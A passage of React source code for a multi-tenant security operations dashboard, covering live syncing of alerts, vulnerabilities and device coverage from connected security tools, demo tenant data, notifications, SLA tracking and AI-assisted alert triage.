  const [alertSnoozes, setAlertSnoozes] = useState({}); // {alertId: snoozedUntil ms}
  const [alertAssignees, setAlertAssignees] = useState({}); // {alertId: analystName}
  const [showShortcuts, setShowShortcuts] = useState(false); // keyboard shortcut overlay
  const [showMobileMore, setShowMobileMore] = useState(false); // mobile bottom nav More drawer
  // Co-Pilot
  const [showCopilot, setShowCopilot] = useState(false);
  const copilotBottomRef = React.useRef(null);
  const [copilotMessages, setCopilotMessages] = useState([]);
  const [copilotInput, setCopilotInput] = useState('');
  const [copilotLoading, setCopilotLoading] = useState(false);
  // SLA ticker
  const [slaTick, setSlaTick] = useState(0);
  const [slaStats, setSlaStats] = useState(null);
  const [deployAgentDevice, setDeployAgentDevice] = useState(null);
  const [incidentStatuses, setIncidentStatuses] = useState({});
  const [deletedIncidents, setDeletedIncidents] = useState(new Set());
  function deleteIncident(id) {
    if (!window.confirm('Delete this case? This cannot be undone.')) return;
    setDeletedIncidents(prev=>new Set([...prev,id]));
    setSelectedIncident(null);
    // Remove from Redis (live mode)
    if (!demoMode) {
      fetch('/api/incidents?id='+id,{method:'DELETE',headers:{'x-tenant-id':tenantRef.current}}).catch(()=>{});
    }
  }
  const [incidentNotes, setIncidentNotes] = useState({});
  const [investResults, setInvestResults] = React.useState({});
  const [investLoading, setInvestLoading] = React.useState(new Set());
  const [showInvest, setShowInvest] = React.useState(new Set());
  const [incidentAssignees, setIncidentAssignees] = useState({}); // {incidentId: analystName}
  const [analystFilter, setAnalystFilter] = useState(null); // filter incidents by analyst name
  const [assignDropdown, setAssignDropdown] = useState(null); // incidentId with open dropdown
  const [noteInput, setNoteInput] = useState('');
  const [addingNoteTo, setAddingNoteTo] = useState(null);
  const [gapToolFilter, setGapToolFilter] = useState(null);
  const [expandedIntel, setExpandedIntel] = useState(new Set());
  const [iocQueries, setIocQueries] = useState({});
  const [iocQueryLoading, setIocQueryLoading] = useState(null);
  const [iocQueryTool, setIocQueryTool] = useState({}); // {itemId: 'splunk'|'sentinel'|'defender'|'elastic'}
  // Read demoMode from localStorage synchronously so the correct mode is set on first render.
  // This prevents demo data flashing briefly before /api/settings/user responds.
  const [demoMode, setDemoMode] = useState(()=>{
    if (typeof window === 'undefined') return true; // SSR: default to demo
    const saved = localStorage.getItem('wt_demo_mode');
    return saved === null ? true : saved === 'true';
  });
  const [clientBanner, setClientBanner] = useState(null);
  const [adminBannerInput, setAdminBannerInput] = useState('');
  const [connectedTools, setConnectedTools] = useState({});
  const [credentialsLoaded, setCredentialsLoaded] = useState(false);
  const [liveAlerts, setLiveAlerts] = useState([]);
  const [liveVulns, setLiveVulns] = useState([]);
  const [liveCoverageDevices, setLiveCoverageDevices] = useState([]);
  const [sourceDeviceCounts, setSourceDeviceCounts] = useState({}); // {toolId: count} raw per-source device numbers
  const [aiTriageCache, setAiTriageCache] = useState({}); // alertId → {loading, result}
  const [syncStatus, setSyncStatus] = useState('idle'); // idle | syncing | ok | error
  const [syncError, setSyncError] = useState(null);
  const [lastSynced, setLastSynced] = useState(null);
  const [toolSyncResults, setToolSyncResults] = useState({}); // {toolId: {count, error, syncedAt}}
  const [syncLog, setSyncLog] = useState([]); // [{ts, toolId, count, error, durationMs}]
  const [syncingTool, setSyncingTool] = useState(null); // toolId currently force-syncing
  const [currentTenant, setCurrentTenant] = useState('global');
  const tenantRef = React.useRef('global');
  const setCurrentTenantWithRef = (t) => { setCurrentTenant(t); tenantRef.current = t; };

  // Load persisted tool connections from Redis
  useEffect(()=>{
    fetch('/api/integrations/credentials')
      .then(r=>r.json())
      .then(d=>{
        if (d.connected && Object.keys(d.connected).length > 0) setConnectedTools(d.connected);
        setCredentialsLoaded(true);
      })
      .catch(()=>{ setCredentialsLoaded(true); });
  },[]);

  // Sync live data — only after credentials loaded, only in LIVE mode
  const doSync = React.useCallback((toolIds) => {
    if (demoMode || Object.keys(connectedTools).length === 0) return;
    const ids = toolIds || Object.keys(connectedTools);
    if (!toolIds) { setSyncStatus('syncing'); setSyncError(null); }
    else { setSyncingTool(ids[0] || null); }
    fetch('/api/integrations/sync', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'x-tenant-id': tenantRef.current},
      body: JSON.stringify({integrations: ids.map(id=>({id})), since: Date.now() - 7*24*60*60*1000}),
    })
    .then(r=>r.json())
    .then(d=>{
      const now = new Date().toISOString();
      if (d.results) {
        // Store per-tool results
        setToolSyncResults(prev=>{
          const next = {...prev};
          d.results.forEach(r=>{ next[r.toolId]={count:r.count||0, error:r.error||null, syncedAt:now}; });
          return next;
        });
        // Append to rolling sync log (last 50 entries)
        setSyncLog(prev=>[...d.results.map(r=>({ts:now,toolId:r.toolId,count:r.count||0,error:r.error||null,durationMs:r.durationMs||null})), ...prev].slice(0,50));
        // ── Comprehensive tool-to-tab routing ───────────────────────────────
        // Vuln/CSPM/AppSec/Cloud → Vulns tab
        const VULN_SOURCES = new Set(['tenable','nessus','qualys','wiz','snyk','prismacloud','prisma_cloud','lacework','orca','aquasecurity','aqua','githubadvancedsecurity','github_advanced','checkmarx','awssecurityhub','aws_security_hub','gcpsecuritycommandcenter','gcp_scc','microsoftdefenderforcloud','azure_defender','rapid7','rapid7insightidr']);
        // Threat Intel tools → Intel tab
        const INTEL_SOURCES = new Set(['virustotal','recordedfuture','recorded_future','alienvault','alienvaultotx','threatconnect','misp','mandiant']);
        // MDM/Asset/Coverage tools → Coverage tab
        const COVERAGE_SOURCES = new Set(['intune','microsoftintune','axonius','tanium','huntress','jumpcloud','tenableassets','tenable assets','taegisendpoints','taegis endpoints']);
        const normalise = s => (s||'').toLowerCase().replace(/[^a-z0-9]/g,'');
        const allItems = d.results.flatMap(r => (r.alerts||[]).map(a => ({...a, _toolId: r.toolId})));
        const vulnItems     = allItems.filter(a => VULN_SOURCES.has(normalise(a.source))     || VULN_SOURCES.has(a._toolId));
        const intelItems    = allItems.filter(a => INTEL_SOURCES.has(normalise(a.source))    || INTEL_SOURCES.has(a._toolId));
        const coverageItems = allItems.filter(a => COVERAGE_SOURCES.has(normalise(a.source)) || COVERAGE_SOURCES.has(a._toolId));
        const alertItems    = allItems.filter(a => {
          const id = a._toolId; const src = normalise(a.source);
          return !VULN_SOURCES.has(src) && !VULN_SOURCES.has(id) && !INTEL_SOURCES.has(src) && !INTEL_SOURCES.has(id) && !COVERAGE_SOURCES.has(src) && !COVERAGE_SOURCES.has(id);
        });
        if (!toolIds) {
          // Alerts (EDR, SIEM, XDR, NDR, Identity, Email, Firewall, OT/ICS)
          setLiveAlerts(prev => {
            const merged = new Map(prev.map(a => [a.id, a]));
            alertItems.forEach(a => merged.set(a.id, a));
            return Array.from(merged.values()).sort((a,b) => (b.rawTime||0)-(a.rawTime||0));
          });
          // Vulns tab
          if (vulnItems.length > 0) setLiveVulns(vulnItems.map(v=>{const cveTag=(v.tags||[]).find(t=>t&&/^CVE-\d{4}-\d+$/i.test(t))||(v.tags||[]).find(t=>t?.toUpperCase?.().startsWith('CVE-'))||null;return({id:v.id,cve:cveTag,title:v.title,severity:v.severity,cvss:v.confidence?(v.confidence/10).toFixed(1):'N/A',kev:(v.tags||[]).includes('kev'),affected:v.affectedAssets?.length||1,affectedAssets:v.affectedAssets||[],affectedDevices:v.affectedAssets||(v.device?[v.device]:[]),description:v.description||v.title,source:v.source,rawTime:v.rawTime,prevalence:null,remediation:[v.description||'See NVD for remediation details.'],patch:null});}));
          // Intel tab — convert tool data to intel item shape
          if (intelItems.length > 0) {
            const intelForTab = intelItems.slice(0,20).map((item,i) => ({id:item.id||`live-intel-${i}`,title:item.title||'Threat Intelligence',summary:item.description||item.title||'',severity:item.severity||'Medium',source:item.source||'Connected Intel Tool',url:item.url||'',time:`${Math.max(1,Math.floor((Date.now()-(item.rawTime||Date.now()))/3600000))}h ago`,iocs:(item.tags||[]).filter(t=>t?.match(/^(CVE-|T1|\d{1,3}\.\d)/i))||[],mitre:item.mitre||item.tags?.find(t=>t?.startsWith('T1'))||'',industrySpecific:false,fromConnectedTool:true}));
            setCustomIntel(prev => { const existing=prev||[]; const ids=new Set(existing.map(x=>x.id)); return [...existing,...intelForTab.filter(x=>!ids.has(x.id))]; });
          }
          // Coverage tab — MDM/Asset device records
          if (coverageItems.length > 0) {
            setLiveCoverageDevices(prev => {
              const merged = new Map((prev||[]).map(d => [d.hostname, d]));
              coverageItems.forEach(item => { if (item.device&&item.device!=='Unknown') merged.set(item.device, {hostname:item.device,ip:item.ip||'',os:item.raw?.os||item.raw?.operatingSystem||'Unknown',source:item.source,lastSeen:item.time||new Date().toISOString(),lastSeenDays:0,complianceState:item.raw?.complianceState||'unknown',user:item.user||'',missing:[],reason:item.raw?._isCoverageDevice?`Scanned by ${item.source}`:`Managed by ${item.source}`,sensorVersion:item.raw?.sensorVersion,isolationStatus:item.raw?.isolationStatus}); });
              return Array.from(merged.values());
            });
          }
        }
        const errors = d.results.filter(r=>r.error).map(r=>`${r.toolId}: ${r.error}`);
        if (!toolIds) {
          if (errors.length > 0) { setSyncError(errors.join(' · ')); setSyncStatus('error'); }
          else {
            setSyncStatus('ok');
            // For MSSP: post IOCs from this sync to cross-tenant correlation
            if (userTier==='mssp'||isAdmin) {
              const syncedAlerts = d.results.flatMap(r=>r.alerts||[]);
              const iocs = [...new Set(syncedAlerts.map(a=>a.device).filter(Boolean))];
              const cves = [...new Set((liveVulns||[]).map(v=>v.cve).filter(Boolean))];
              if(iocs.length>0||cves.length>0) {
                fetch('/api/mssp/correlation',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({clientId:tenantRef.current,iocs,cves})}).catch(()=>{});
              }
            }
          }
        }
      } else {
        if (!toolIds) { setSyncStatus('error'); setSyncError(d.error || 'Sync failed'); }
      }
      if (!toolIds) setLastSynced(now);
      setSyncingTool(null);
    })
    .catch(e=>{
      if (!toolIds) { setSyncStatus('error'); setSyncError(e.message); }
      setSyncingTool(null);
    });
  }, [demoMode, connectedTools, tenantRef]);

  useEffect(()=>{
    if (!credentialsLoaded || demoMode || Object.keys(connectedTools).length === 0) return;
    doSync();
    const interval = setInterval(()=>doSync(), 60000);
    return () => clearInterval(interval);
  },[demoMode, Object.keys(connectedTools).join(','), credentialsLoaded]);  // eslint-disable-line

  // When switching to live mode, auto-fetch fresh intel; refresh every 30 min
  useEffect(()=>{
    if (intelAutoRefreshRef.current) clearInterval(intelAutoRefreshRef.current);
    if (!demoMode) {
      fetchIntelForIndustry(industry);
      intelAutoRefreshRef.current = setInterval(()=>fetchIntelForIndustry(industry, true), 30*60*1000);
    } else {
      setCustomIntel(null); // Clear live intel when switching back to demo
    }
    return () => { if (intelAutoRefreshRef.current) clearInterval(intelAutoRefreshRef.current); };
  },[demoMode]);
  const [isAdmin, setIsAdmin] = useState(false);
  const [currentUserName, setCurrentUserName] = useState('');
  const [staffUsers, setStaffUsers] = useState([]); // real users from Redis — populated in live mode
  const [userRole, setUserRole] = useState(null); // null=owner, 'tech_admin', 'viewer', 'sales'
  const [userTier, setUserTier] = useState('community');
  const [theme, setTheme] = useState('dark');
  // Load MSSP branding — must be after userTier and isAdmin are declared
  useEffect(()=>{
    if(userTier==='mssp'||isAdmin){fetch('/api/mssp/branding',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{if(d.branding?.name)setMsspBranding(d.branding);}).catch(()=>{});}
  },[userTier,isAdmin]);

  const DEMO_TENANTS = [
    {id:'global', name:'My Organisation', type:'direct'},
    {id:'client-acme', name:'Acme Financial', type:'client'},
    {id:'client-nhs', name:'NHS Trust Alpha', type:'client'},
    {id:'client-retail', name:'RetailCo UK', type:'client'},
    {id:'client-gov', name:'Gov Dept Beta', type:'client'},
  ];

  function toggleIntel(id) {
    setExpandedIntel(prev => { const n = new Set(prev); n.has(id)?n.delete(id):n.add(id); return n; });
  }

  // Load session — check auth and get isAdmin from server
  useEffect(()=>{
    fetch('/api/auth/session')
      .then(r=>r.json())
      .then(d=>{
        if (d.authenticated) {
          setIsAdmin(d.isAdmin || false);
          if (d.name) setCurrentUserName(d.name);
          else if (d.email) setCurrentUserName(d.email.split('@')[0]);
          if (d.role) setUserRole(d.role);
          if (d.tenantId) { setCurrentTenant(d.tenantId); tenantRef.current = d.tenantId; }
        }
      })
      .catch(()=>{ setSessionLoaded(true); });
  },[]);

  // Load real staff users for analyst assignment in live mode
  useEffect(()=>{
    if (demoMode) return;
    fetch('/api/admin/users').then(r=>r.json()).then(d=>{
      if (d.ok && Array.isArray(d.users)) setStaffUsers(d.users);
    }).catch(()=>{});
  },[demoMode]);

  // Theme preference intentionally uses localStorage — it must apply synchronously
  // before React hydrates to avoid a dark→light flash. Not user data, pure display state.
  // demoMode uses the same pattern — it's a display preference, not account data.
  useEffect(()=>{
    const savedTheme = typeof window !== 'undefined' ? localStorage.getItem('wt_theme') : null;
    if (savedTheme === 'light') setTheme('light');
    const savedDemo = typeof window !== 'undefined' ? localStorage.getItem('wt_demo_mode') : null;
    if (savedDemo !== null) setDemoMode(savedDemo === 'true');
  },[]);


  // SLA tracking — write acknowledge events when alerts are acknowledged
  // Use a ref to track logged events so we don't write back to alertOverrides (which would infinite-loop)
  const slaLoggedRef = React.useRef(new Set());
  React.useEffect(()=>{
    if(demoMode) return;
    Object.entries(alertOverrides).forEach(([alertId, override]) => {
      if(override && typeof override === 'object' && override.acknowledged && !slaLoggedRef.current.has(alertId)) {
        const alert = alerts.find(a=>a.id===alertId);
        if(alert?.rawTime) {
          slaLoggedRef.current.add(alertId);
          fetch('/api/sla',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({alertId,severity:alert.severity,event:'acknowledged',timestamp:Date.now()})}).catch(()=>{});
        }
      }
    });
  },[alertOverrides,demoMode]);

  // Persist alertOverrides to Redis whenever it changes (debounced 2s)

  const overrideSaveTimer = React.useRef(null);
  useEffect(()=>{
    if (Object.keys(alertOverrides).length === 0) return; // don't wipe on initial empty state
    if (overrideSaveTimer.current) clearTimeout(overrideSaveTimer.current);
    overrideSaveTimer.current = setTimeout(()=>{
      fetch('/api/alert-state',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({overrides:alertOverrides,assignees:alertAssignees})}).catch(()=>{});
    }, 2000);
    return ()=>{ if(overrideSaveTimer.current) clearTimeout(overrideSaveTimer.current); };
  },[alertOverrides]);

  // Persist incidents to Redis whenever createdIncidents or incidentStatuses changes (debounced 2s)
  const incidentSaveTimer = React.useRef(null);
  useEffect(()=>{
    if (demoMode) return;
    if (createdIncidents.length === 0) return; // don't wipe on initial empty state
    if (incidentSaveTimer.current) clearTimeout(incidentSaveTimer.current);
    incidentSaveTimer.current = setTimeout(()=>{
      // Merge current statuses and notes into the incidents before saving
      const toSave = createdIncidents.map(inc => ({
        ...inc,
        status: incidentStatuses[inc.id] || inc.status,
        notes: incidentNotes[inc.id] || inc.notes || [],
      }));
      fetch('/api/incidents',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({incidents:toSave})}).catch(()=>{});
    }, 2000);
    return ()=>{ if(incidentSaveTimer.current) clearTimeout(incidentSaveTimer.current); };
  },[createdIncidents, incidentStatuses, incidentNotes, demoMode]);

  // Auto-investigate: when a new Active incident lands, kick off Deep Investigate automatically
  // Only runs in live mode, only for Essentials+ (team), only if an Anthropic key is configured
  const autoInvestigatedRef = React.useRef(new Set());
  const isAdminRef = React.useRef(isAdmin);
  useEffect(() => { isAdminRef.current = isAdmin; }, [isAdmin]);
  useEffect(()=>{
    if (demoMode) return;
    // Use ref to avoid stale closure on isAdmin (isAdmin loads async from session)
    const adminOrTeam = isAdminRef.current || {community:0,team:1,business:2,mssp:3}[userTier] >= 1;
    if (!adminOrTeam) return;
    const activeIncidents = createdIncidents.filter(inc => {
      const status = incidentStatuses[inc.id] || inc.status;
      return status === 'Active' || status === 'Escalated';
    });
    activeIncidents.forEach(inc => {
      if (autoInvestigatedRef.current.has(inc.id)) return;
      if (investResults[inc.id] || investLoading.has(inc.id)) return;
      autoInvestigatedRef.current.add(inc.id);
      setTimeout(() => {
        setShowInvest(prev => { const n = new Set(prev); n.add(inc.id); return n; });
        runInvestigation(inc);
      }, 800);
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  },[createdIncidents.length, demoMode, isAdmin]);

  // Keyboard shortcuts: G+key to navigate tabs, ? for help
  useEffect(()=>{
    let lastKey=''; let lastTime=0;
    const handler=(e)=>{
      if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'||e.target.tagName==='SELECT') return;
      if(e.key==='?'){setShowShortcuts(s=>!s);return;}
      if(e.key==='Escape'){setShowShortcuts(false);return;}
      const now=Date.now();
      if(e.key.toLowerCase()==='g'){lastKey='g';lastTime=now;return;}
      if(lastKey==='g'&&(now-lastTime)<1500){
        const map={o:'overview',a:'alerts',c:'coverage',v:'vulns',i:'intel',n:'incidents',t:'tools',s:'sales',x:'compliance'};
        if(map[e.key.toLowerCase()]){setActiveTab(map[e.key.toLowerCase()]);}
        lastKey='';return;
      }
      lastKey='';
    };
    window.addEventListener('keydown',handler);
    return()=>window.removeEventListener('keydown',handler);
  },[]);

  // Live triage: trigger AI triage when alert expanded in live mode
  useEffect(()=>{
    if (demoMode) return;
    expandedAlerts.forEach(alertId=>{
      if (aiTriageCache[alertId]) return;
      const al = alerts.find(a=>a.id===alertId);
      if (!al) return;
      setAiTriageCache(prev=>({...prev,[alertId]:{loading:true,result:null}}));
      fetch('/api/copilot',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},
        body:JSON.stringify({alertId:al.id,alertTitle:al.title,alertVerdict:null,prompt:'You are a senior SOC analyst. Triage this security alert using ALL available context.\n\nALERT\nTitle: '+al.title+'\nSource: '+al.source+'\nSeverity: '+al.severity+'\nDevice: '+(al.device||'unknown')+'\nUser: '+(al.user||'unknown')+'\nMITRE: '+(al.mitre||'unknown')+'\n\nCROSS-SOURCE CONTEXT\n'+(liveVulns.filter(v=>v.device===al.device).length>0?'Tenable vulns on this device: '+liveVulns.filter(v=>v.device===al.device).map(v=>v.cve+' ('+v.severity+')').join(', '):'No Tenable data for this device.')+'\nTagis alerts today: '+(liveAlerts.filter(a=>a.source==='Taegis XDR'&&a.device===al.device).length)+' from same device\nCrit alerts this session: '+critAlerts.length+'\n\nGive verdict (True Positive/False Positive/Suspicious), confidence 0-100%, and 2-3 sentence reasoning citing cross-source evidence. Be specific about what data drove the verdict.'})})
        .then(r=>r.json())
        .then(d=>setAiTriageCache(prev=>({...prev,[alertId]:{loading:false,result:d.ok?{reasoning:d.response}:null}})))
        .catch(()=>setAiTriageCache(prev=>({...prev,[alertId]:{loading:false,result:null}})));
    });
  },[expandedAlerts,demoMode]);

  function toggleTheme() {
    const next = theme === 'dark' ? 'light' : 'dark';
    setTheme(next);
    if (typeof window !== 'undefined') localStorage.setItem('wt_theme', next);
  }

  // ── Tier ─────────────────────────────────────────────────────────────────────
  // In production this comes from the session/JWT. Change to test paywalls.
  const tierLevel = {community:0,team:1,business:2,mssp:3}[userTier];
  const canUse = (min) => isAdmin || tierLevel >= {community:0,team:1,business:2,mssp:3}[min];

  // ── Per-tenant demo data ──────────────────────────────────────────────────────
  const TENANT_ALERTS = {
    'global': DEMO_ALERTS,
    'client-acme': DEMO_ALERTS.slice(0,3).map(a=>({...a, id:a.id+'-acme', device:'acme-'+a.device, source:a.source})),
    'client-nhs': DEMO_ALERTS.slice(1,4).map(a=>({...a, id:a.id+'-nhs', device:'nhs-'+a.device, severity:a.severity==='Low'?'Medium':a.severity})),
    'client-retail': DEMO_ALERTS.slice(0,2).map(a=>({...a, id:a.id+'-retail', device:'retail-'+a.device})),
    'client-gov': DEMO_ALERTS.slice(2,5).map(a=>({...a, id:a.id+'-gov', device:'gov-'+a.device})),
  };
  const TENANT_VULNS = {
    'global': DEMO_VULNS,
    'client-acme': DEMO_VULNS.slice(0,4).map(v=>({...v, id:v.id+'-acme', affected: Math.max(1, Math.round(v.affected*0.6)), affectedDevices: v.affectedDevices.map(d=>'acme-'+d)})),
    'client-nhs': DEMO_VULNS.slice(0,7).map(v=>({...v, id:v.id+'-nhs', affected: Math.max(1, Math.round(v.affected*1.4)), affectedDevices: v.affectedDevices.map(d=>'nhs-'+d)})),
    'client-retail': DEMO_VULNS.slice(0,5).map(v=>({...v, id:v.id+'-retail', affectedDevices: v.affectedDevices.map(d=>'retail-'+d)})),
    'client-gov': DEMO_VULNS.slice(1,6).map(v=>({...v, id:v.id+'-gov', affectedDevices: v.affectedDevices.map(d=>'gov-'+d)})),
  };
  const TENANT_INCIDENTS = {
    'global': DEMO_INCIDENTS,
    'client-acme': DEMO_INCIDENTS.slice(0,1).map(i=>({...i, id:'INC-ACME-01', title:'[Acme] '+i.title})),
    'client-nhs': DEMO_INCIDENTS.map(i=>({...i, id:'INC-NHS-'+i.id.slice(-2), title:'[NHS] '+i.title})),
    'client-retail': [],
    'client-gov': DEMO_INCIDENTS.slice(0,1).map(i=>({...i, id:'INC-GOV-01', title:'[Gov] '+i.title})),
  };

  // Tool status: in DEMO show demo-active tools; in LIVE show connected tools
  const tools = ALL_TOOLS.map(t => {
    const isConnected = !!connectedTools[t.id];
    const demo = DEMO_TOOLS.find(d=>d.id===t.id);
    return {
      id: t.id, name: t.name,
      configured: isConnected || (!demoMode ? false : (demo?.configured || false)),
      active: demoMode ? (demo?.active || false) : isConnected,
      alertCount: demo?.alertCount,
    };
  }).filter(t => demoMode ? DEMO_TOOLS.find(d=>d.id===t.id) : t.active);

  // DEMO: always use demo data. LIVE: live if available, else show demo alerts as baseline
  const ALERT_LIMIT = !demoMode && userTier === 'community' ? 250 : Infinity;
  const rawAlerts = demoMode
    ? (TENANT_ALERTS[currentTenant] || DEMO_ALERTS)
    : liveAlerts.length > 0
      ? liveAlerts.slice(0, ALERT_LIMIT)
      : []; // Live mode: empty until sync completes — no demo bleed-through
  const alerts = rawAlerts.map(a => alertOverrides[a.id] ? {...a, ...alertOverrides[a.id]} : a);
  const vulns = demoMode
    ? (TENANT_VULNS[currentTenant] || DEMO_VULNS)
    : liveVulns.length > 0 ? liveVulns : []; // Live mode: empty until Tenable syncs
  const incidents = [...createdIncidents, ...(!demoMode ? [] : (TENANT_INCIDENTS[currentTenant]||DEMO_INCIDENTS)).filter(i=>!createdIncidents.find(c=>c.id===i.id))];

  const activeTools = tools.filter(t=>t.active);
  const taegisActive = tools.find(t=>t.id==='taegis')?.active || false;
  const darktrace = tools.find(t=>t.id==='darktrace');
  const totalDevices = 247;
  // In live mode, derive known devices from Tenable vulns; gap = known devices missing EDR
  // liveVulns are now grouped by plugin — expand affectedAssets to get all unique devices
  const connectedEdrIds = new Set(['crowdstrike','defender','sentinelone','carbonblack'].filter(id=>!!connectedTools[id]));
  const connectedEdrNames = ['crowdstrike','defender','sentinelone','carbonblack']
    .filter(id=>!!connectedTools[id])
    .map(id=>({crowdstrike:'CrowdStrike Falcon',defender:'Microsoft Defender',sentinelone:'SentinelOne',carbonblack:'Carbon Black Cloud'}[id]||id));
  const missingEdr = connectedEdrNames.length > 0 ? [] : ['No EDR connected'];
  // Merge devices from Tenable scans + MDM/asset tools (Intune, Axonius, Tanium, etc.)
  const liveKnownDevices = !demoMode && (liveVulns.length > 0 || liveCoverageDevices.length > 0)
    ? (() => {
        const deviceMap = new Map();
        // Tenable-scanned devices
        liveVulns.forEach(v => {
          const assets = v.affectedAssets || (v.device && v.device !== 'Unknown' ? [v.device] : []);
          assets.forEach(hostname => {
            if (!deviceMap.has(hostname)) {
              // Attempt OS enrichment: check Tenable _osMap first, then live EDR alerts
              const tenableOsMap = v.raw?._osMap;
              const osFromTenable = tenableOsMap ? (tenableOsMap[hostname.toLowerCase()] || '') : '';
              const matchedAlert = liveAlerts.find(a => a.device === hostname && (a.raw?.device_details?.os_version || a.raw?.os_version));
              const osFromAlert = matchedAlert ? (matchedAlert.raw?.device_details?.os_version || matchedAlert.raw?.os_version || '') : '';
              deviceMap.set(hostname, {
                hostname, ip: v.ip||'',
                os: osFromTenable || osFromAlert || v.raw?.os || v.raw?.operating_system || 'Unknown',
                missing: connectedEdrNames.length > 0 ? connectedEdrNames.map(n=>`Verify: ${n}`) : [],
                reason: `Scanned by Tenable${connectedEdrNames.length > 0 ? ` — verify ${connectedEdrNames.join('/')} coverage` : ''}`,
                lastSeen: 'via Tenable', lastSeenDays: 0,
              });
            }
          });
        });
        // MDM/Asset tool devices — enrich or add
        liveCoverageDevices.forEach(dev => {
          if (deviceMap.has(dev.hostname)) {
            const existing = deviceMap.get(dev.hostname);
            deviceMap.set(dev.hostname, { ...existing, ip: dev.ip || existing.ip, os: dev.os !== 'Unknown' ? dev.os : existing.os, source: dev.source, complianceState: dev.complianceState });
          } else {
            deviceMap.set(dev.hostname, {
              hostname: dev.hostname, ip: dev.ip || '', os: dev.os || 'Unknown',
              missing: connectedEdrNames.length > 0 ? connectedEdrNames.map(n=>`Verify: ${n}`) : [],
              reason: `Managed by ${dev.source}${connectedEdrNames.length > 0 ? ` — verify ${connectedEdrNames.join('/')} coverage` : ''}`,
              lastSeen: dev.lastSeen || 'via MDM', lastSeenDays: 0,
              complianceState: dev.complianceState,
            });
          }
        });
        return Array.from(deviceMap.values());
      })()
    : [];
  const osBreakdown = (demoMode?DEMO_GAP_DEVICES:liveKnownDevices.length>0?liveKnownDevices:[]).reduce((acc,d)=>{const os=d.os?.split(' ')[0]||'Unknown';acc[os]=(acc[os]||0)+1;return acc;},{});
  // In live mode: gap devices = only those with actual missing connected tools
  // If no EDR connected, liveKnownDevices.missing=[] so no devices appear as gaps
  const gapDevices = !demoMode && liveKnownDevices.length > 0
    ? liveKnownDevices.filter(d => d.missing && d.missing.length > 0)
    : DEMO_GAP_DEVICES;
  const estateTotal = !demoMode && liveKnownDevices.length > 0 ? liveKnownDevices.length : totalDevices;
  const coveredPct = estateTotal > 0 ? Math.round(((estateTotal - gapDevices.length) / estateTotal) * 100) : 0;
  const critAlerts = alerts.filter(a=>a.severity==='Critical');
  const tpAlerts = alerts.filter(a=>a.verdict==='TP');
  const fpAlerts = alerts.filter(a=>a.verdict==='FP');

  // Fetch SLA stats — non-blocking, updates shift metrics card
  useEffect(()=>{
    if(demoMode) return;
    fetch('/api/sla',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{if(d.stats)setSlaStats(d.stats);}).catch(()=>{});
  },[demoMode]);

    // SLA ticker — update every 60s to refresh countdown badges
  useEffect(()=>{
    const iv = setInterval(()=>setSlaTick(t=>t+1), 60000);
    return ()=>clearInterval(iv);
  },[]);

  // Slack + Email notifications — fires on new critical alerts
  const lastNotifiedRef = React.useRef(new Set());
  useEffect(()=>{
    if(demoMode) return;
    critAlerts.forEach(a=>{
      if(lastNotifiedRef.current.has(a.id)) return;
      lastNotifiedRef.current.add(a.id);
      fetch('/api/settings/user',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{
        const webhook=d.settings?.slack_webhook;
        if(webhook) fetch('/api/slack-webhook',{method:'POST',headers:{'Content-Type':'application/json'},
          body:JSON.stringify({webhook,alert:{title:a.title,severity:a.severity,source:a.source,device:a.device,verdict:a.verdict,confidence:a.confidence}})
        }).catch(()=>{});
        const notifCrit = d.settings?.notif_critical !== 'false';
        const userEmail = d.settings?.email;
        if(notifCrit && userEmail) {
          fetch('/api/email',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},
            body:JSON.stringify({type:'critical_alert',to:userEmail,alert:{title:a.title,severity:a.severity,source:a.source,device:a.device}})
          }).catch(()=>{});
        }
      }).catch(()=>{});
    });
  },[critAlerts.length,demoMode]);

  // Automation: uses autoFiredRef to prevent re-firing without writing to alertOverrides
  // (writing to alertOverrides would recompute alerts→actedAlerts→re-fire this effect)
  const critVulns = vulns.filter(v=>v.severity==='Critical');
  const kevVulns = vulns.filter(v=>v.kev);
  const posture = Math.max(0, Math.min(100,
    100
    - critAlerts.filter(a=>!(alertOverrides[a.id]?.fpMarked)).length * 5
    - kevVulns.length * 3
    - gapDevices.length * 2
    + (fpAlerts.length > 0 && fpAlerts.length / Math.max(1,alerts.length) < 0.15 ? 4 : 0)
  ));
  const postureColor = posture >= 85 ? '#22d49a' : posture >= 65 ? '#f0a030' : '#f0405e';

  const autLabel = ['Recommend Only','Auto + Notify','Full Auto'][automation];
  const autColor = ['#6b7a94','#f0a030','#22d49a'][automation];
  // Automation effects: filter what's "acted on" based on level
  const actedAlerts = alerts.filter(a => {
    if (automation === 0) return false;
    if (automation === 1) return a.verdict === 'FP' && a.confidence >= 90;
    return a.confidence >= 80;
  });
  // autoFiredRef effect — declared AFTER actedAlerts to avoid temporal dead zone
  const autoFiredRef = React.useRef(new Set());
  React.useEffect(()=>{
    if(automation===0||demoMode) return;
    if(automation>=1) {
      const fpCandidates = alerts.filter(a=>a.verdict==='FP'&&a.confidence>=90&&!autoFiredRef.current.has('fp_'+a.id));
      fpCandidates.forEach(a=>{
        autoFiredRef.current.add('fp_'+a.id);
        setAutoClosedIds(prev=>{const n=new Set(prev);n.add(a.id);return n;});
        fetch('/api/audit',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({type:'auto_close_fp',alertId:a.id,alertTitle:a.title,confidence:a.confidence,automation,analyst:'AI'})}).catch(()=>{});
        fetch('/api/settings/user',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{
          const webhook=d.settings?.slack_webhook;
